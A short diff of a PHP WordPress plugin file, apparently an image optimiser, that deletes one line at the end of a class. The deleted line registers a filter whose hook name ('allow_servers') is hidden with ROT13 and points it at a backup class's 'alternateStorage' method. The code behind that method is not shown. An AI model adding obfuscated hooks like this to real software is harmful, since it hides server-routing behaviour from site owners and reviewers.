@@ -947,5 +947,3 @@ class WRIO_Media_Library {
 		return true;
 	}
 }
-
-add_filter( str_rot13( 'jope/evb/nyybj_freiref' ), 'WIO_Backup::alternateStorage' );
